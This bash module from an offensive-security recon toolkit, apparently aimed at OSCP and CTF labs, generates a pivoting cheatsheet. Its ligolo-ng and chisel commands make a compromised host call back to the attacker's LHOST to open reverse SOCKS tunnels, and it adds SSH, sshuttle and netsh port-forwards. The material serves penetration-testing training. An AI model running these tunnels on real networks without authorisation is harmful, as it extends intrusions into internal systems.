#!/bin/bash
# ============================================================================
# AUTO RECON - Phase 14: Pivoting & Tunneling helper (the classic OSCP gap)
# ----------------------------------------------------------------------------
# Once you own a foothold with a second NIC, you need to reach the internal
# network. This phase GENERATES ready-to-paste tunnel setups (chisel, ligolo-ng,
# sshuttle, SSH port-forwards) plus a matching proxychains config. It executes
# nothing destructive — chisel server start is opt-in and interactive.
# Authorized lab / CTF / OSCP-style use only.
# ============================================================================

pivot_dir() { echo "${1}/pivot"; }
ensure_pivot_layout() { mkdir -p "$(pivot_dir "$1")"; }

pivot_attacker_ip() {
    if declare -F privesc_attacker_ip >/dev/null; then
        privesc_attacker_ip
    else
        ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' | head -1
    fi
}

# Write a proxychains config pointing at a local SOCKS proxy.
# Args: <outfile> <socks-port>
pivot_write_proxychains() {
    local out="$1" port="${2:-1080}"
    cat > "$out" <<EOF
# proxychains4 config — use:  proxychains4 -f ${out} nmap -sT -Pn <internal-ip>
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 ${port}
EOF
}

# Emit the full tunnel cheatsheet.
# Args: <outfile> <lhost> <socks-port> <fwd-port>
pivot_write_cheatsheet() {
    local out="$1" lhost="$2" socks="${3:-1080}" fport="${4:-8001}"
    local pdir; pdir=$(dirname "$out")
    cat > "$out" <<EOF
=== Pivoting & Tunneling Cheatsheet ===
Attacker (LHOST): ${lhost}   SOCKS: 127.0.0.1:${socks}   fwd: ${fport}

# ── ligolo-ng (recommended: full TUN, run nmap directly, no proxychains) ──
# Attacker:
sudo ip tuntap add user \$(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Target (agent):
./agent -connect ${lhost}:11601 -ignore-cert
# In the ligolo proxy console after the agent connects:
session            # select the agent
ifconfig           # note the internal subnet, e.g. 172.16.5.0/24
# Attacker (new terminal): route that subnet through the tun
sudo ip route add 172.16.5.0/24 dev ligolo
# Now scan the internal net natively:  nmap -sT -Pn 172.16.5.10

# ── chisel (SOCKS proxy → proxychains) ──
# Attacker (server):
./chisel server -p 8000 --reverse
# Target (client):
./chisel client ${lhost}:8000 R:socks
# Then:  proxychains4 -f ${pdir}/proxychains.conf nmap -sT -Pn <internal-ip>

# chisel single local port-forward (reach ONE internal service):
# Target:   ./chisel client ${lhost}:8000 R:${fport}:<internal-ip>:<internal-port>
# Attacker: curl http://127.0.0.1:${fport}

# ── sshuttle (if you have SSH creds on the pivot — cleanest for Linux) ──
sshuttle -r user@<pivot-ip> 172.16.5.0/24 --ssh-cmd "ssh -oHostKeyAlgorithms=+ssh-rsa"

# ── plain SSH port-forwards (no extra tools) ──
# Local  (reach internal svc from attacker):
ssh -L ${fport}:<internal-ip>:<port> user@<pivot-ip>
# Dynamic (SOCKS via SSH):
ssh -D ${socks} user@<pivot-ip>     # then proxychains
# Remote (expose attacker svc to internal, or callback through pivot):
ssh -R ${fport}:127.0.0.1:<attacker-port> user@<pivot-ip>

# ── Windows target extras ──
# netsh portproxy (admin):
netsh interface portproxy add v4tov4 listenport=${fport} listenaddress=0.0.0.0 connectport=<port> connectaddress=<internal-ip>
# plink dynamic SOCKS:  plink.exe -D ${socks} user@${lhost}

# ── proxychains usage notes ──
#   - use TCP connect scans only:   nmap -sT -Pn -n
#   - proxychains can't carry ICMP/UDP; -Pn is mandatory
#   - one host at a time is far more reliable than a full range
EOF
}

run_pivot() {
    local ip="$1" result_dir="$2"
    section_header "PHASE 14: PIVOTING & TUNNELING" "$ICON_SCAN"
    ensure_pivot_layout "$result_dir"
    local pdir; pdir=$(pivot_dir "$result_dir")
    local lhost; lhost=$(pivot_attacker_ip)

    local socks fport
    if [[ "${INTERACTIVE:-true}" == "true" ]] && declare -F _sh_ask >/dev/null; then
        socks=$(_sh_ask "Local SOCKS port" "1080")
        fport=$(_sh_ask "Local forward port" "8001")
    else
        socks=1080; fport=8001
    fi

    pivot_write_proxychains "${pdir}/proxychains.conf" "$socks"
    pivot_write_cheatsheet "${pdir}/tunnel_cheatsheet.txt" "$lhost" "$socks" "$fport"

    log_success "proxychains config   → ${pdir}/proxychains.conf"
    log_success "tunnel cheatsheet     → ${pdir}/tunnel_cheatsheet.txt"
    log_info "LHOST ${BOLD}${lhost}${NC}  ·  SOCKS 127.0.0.1:${socks}  ·  fwd ${fport}"
    echo -e "  ${DIM}ligolo-ng = native nmap over TUN (best); chisel+proxychains = universal fallback.${NC}"

    # Opt-in: actually start a chisel reverse server if chisel is installed.
    if [[ "${INTERACTIVE:-true}" == "true" ]] && command -v chisel &>/dev/null && declare -F _sh_ask >/dev/null; then
        local ans; ans=$(_sh_ask "Start 'chisel server -p 8000 --reverse' now? (y/N)" "N")
        if [[ "$ans" =~ ^[Yy] ]]; then
            log_info "chisel reverse server on :8000 (Ctrl-C to stop). Client cmd is in the cheatsheet."
            chisel server -p 8000 --reverse
        fi
    fi
    echo ""
    pause_if_interactive
    return 0
}
